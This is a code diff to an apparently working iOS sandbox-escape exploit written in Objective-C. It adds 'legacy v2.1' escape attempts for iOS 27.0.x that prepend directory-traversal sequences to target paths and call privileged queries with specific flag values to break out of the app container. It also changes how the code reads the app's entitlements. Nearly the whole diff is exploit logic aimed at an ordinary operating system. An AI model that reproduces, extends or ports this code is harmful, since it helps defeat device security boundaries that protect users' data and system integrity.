@@ -85,7 +85,8 @@ NSString *BQDocuments(void) {
 }
 
 NSString *BQGroupID(void) {
-    if (!gGroupID) {
+    static dispatch_once_t entitlementOnce;
+    dispatch_once(&entitlementOnce, ^{
         // Read the app's own entitlements via SecTask. This lets the exploit use
         // whatever app group the running build actually has, instead of a
         // hardcoded identifier.
@@ -119,7 +120,7 @@ NSString *BQGroupID(void) {
             }
         }
         BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
-    }
+    });
     return gGroupID;
 }
 
@@ -912,6 +913,48 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     if (!target.length) return -1;
     bq_load_mcm();
     int64_t last = -1;
+
+    // iOS 27.0.x compatibility: restore the three original 2.1 queries before
+    // the newer v2.4.3 fallbacks. The legacy form used the include-path bit
+    // (0x0100000000) which was removed from those queries in v2.4.3.
+    // Only attempt these on 27.0.x, where v2.1 was previously confirmed.
+    BOOL legacy270 = [[[UIDevice currentDevice] systemVersion] hasPrefix:@"27.0."];
+    if (legacy270 && target.isAbsolutePath) {
+        NSString *dom = [bq_dots(12) stringByAppendingString:target];
+        NSString *p = nil;
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
+                                    @"legacy-v21-class13-traversal", &p);
+        if (h >= 0) {
+            gTraversalState = 1;
+            if (linkOut) *linkOut = p ?: target;
+            BQLog(@"escape: legacy v2.1 class13 traversal succeeded");
+            return h;
+        }
+        last = h;
+    }
+    if (legacy270 && [target isEqualToString:kMGCaches]) {
+        NSString *p = nil;
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
+                                    @"legacy-v21-class13-direct", &p);
+        if (h >= 0) {
+            if (linkOut) *linkOut = p ?: target;
+            BQLog(@"escape: legacy v2.1 class13 direct succeeded");
+            return h;
+        }
+        last = h;
+    }
+    if (legacy270 && target.isAbsolutePath) {
+        NSString *dom = [bq_dots(12) stringByAppendingString:target];
+        NSString *p = nil;
+        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom,
+                                    0x8100000000ULL, @"legacy-v21-class12-geod", &p);
+        if (h >= 0) {
+            if (linkOut) *linkOut = p ?: target;
+            BQLog(@"escape: legacy v2.1 class12 geod succeeded");
+            return h;
+        }
+        last = h;
+    }
 
     // 0. Exact bad_query file form (free-certificate path used by GestaltEdit).
     if ([target isEqualToString:kMGCaches] || [target hasSuffix:@"/Library/Caches"]) {
